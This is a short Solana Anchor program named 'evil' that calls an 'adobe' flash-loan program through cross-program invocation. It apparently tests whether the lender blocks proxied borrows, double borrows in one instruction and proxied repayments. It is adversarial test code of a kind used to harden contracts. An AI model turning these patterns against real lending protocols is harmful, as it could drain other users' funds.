use anchor_lang::prelude::*;
use adobe::cpi::accounts::{ Borrow, Repay};

declare_id!("5zAQ1XhjuHcQtUXJSTjbmyDagmKVHDMi5iADv5PfYEUK");

#[program]
pub mod evil {
    use super::*;

    pub fn borrow_proxy(ctx: Context<Adobe>, amount: u64) -> Result<()> {
        msg!("evil borrow_proxy");

        adobe::cpi::borrow(ctx.accounts.into_borrow_context(), amount)?;

        Ok(())
    }

    pub fn borrow_double(ctx: Context<Adobe>, amount: u64) -> Result<()> {
        msg!("evil borrow_double");

        adobe::cpi::borrow(ctx.accounts.into_borrow_context(), amount)?;
        adobe::cpi::borrow(ctx.accounts.into_borrow_context(), amount)?;

        Ok(())
    }

    pub fn repay_proxy(ctx: Context<Adobe>, amount: u64) -> Result<()> {
        msg!("evil repay_proxy");

        adobe::cpi::repay(ctx.accounts.into_repay_context(), amount)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Adobe<'info> {
    #[account(mut, signer)]
    /// CHECK:
    pub user: AccountInfo<'info>,
    /// CHECK:
    pub state: AccountInfo<'info>,
    #[account(mut)]
    /// CHECK:
    pub pool: AccountInfo<'info>,
    /// CHECK:
    pub pool_token: AccountInfo<'info>,
    /// CHECK:
    pub user_token: AccountInfo<'info>,
    /// CHECK:
    pub instructions: AccountInfo<'info>,
    /// CHECK:
    pub token_program: AccountInfo<'info>,
    /// CHECK:
    pub adobe_program: AccountInfo<'info>,
}

impl<'info> Adobe<'info> {
    fn into_borrow_context(&self) -> CpiContext<'_, '_, '_, 'info, Borrow<'info>> {
        CpiContext::new(
            self.adobe_program.clone(),
            Borrow {
                state: self.state.clone(),
                pool: self.pool.clone(),
                pool_token: self.pool_token.clone(),
                user_token: self.user_token.clone(),
                instructions: self.instructions.clone(),
                token_program: self.token_program.clone(),
            },
        )
    }

    fn into_repay_context(&self) -> CpiContext<'_, '_, '_, 'info, Repay<'info>> {
        CpiContext::new(
            self.adobe_program.clone(),
            Repay {
                user: self.user.clone(),
                state: self.state.clone(),
                pool: self.pool.clone(),
                pool_token: self.pool_token.clone(),
                user_token: self.user_token.clone(),
                instructions: self.instructions.clone(),
                token_program: self.token_program.clone(),
            },
        )
    }
}
